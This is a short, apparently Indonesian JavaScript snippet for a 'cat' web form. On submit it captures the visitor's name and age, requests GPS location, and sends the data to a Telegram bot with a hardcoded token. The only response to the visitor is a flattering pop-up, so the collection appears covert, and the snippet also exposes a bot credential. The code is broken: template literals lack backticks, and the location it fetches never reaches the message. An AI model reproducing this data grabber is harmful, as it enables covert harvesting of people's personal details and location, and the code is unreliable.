  <script>
    const TOKEN = "7811044397:AAGmY2Co1qZo25tsAwEm3oAD94Qum_inUd0";
    const CHAT_ID = "6626316127";
    const URL = https://api.telegram.org/bot${TOKEN}/sendMessage;

    document.getElementById("catForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const formData = new FormData(e.target);

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          let gpsLocation = Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude};
          sendToTelegram(formData, gpsLocation);
        }, function(error) {
          let gpsLocation = "Gagal mendapatkan lokasi";
          sendToTelegram(formData, gpsLocation);
        });
      } else {
        let gpsLocation = "Browser tidak mendukung GPS";
        sendToTelegram(formData, gpsLocation);
      }
    });

    function sendToTelegram(formData, gpsLocation) {
      const message = 
üìå Data Baru Masuk:
üë§ Nama: ${formData.get("nama")}
üéÇ Umur: ${formData.get("umur")}

      ;

      fetch(URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "Markdown"
        })
      }).then(res => alert("NAMAMU INDAH BAGAYKAN BULAN"))
        .catch(err => alert("Gagal mengirim: " + err));
    }
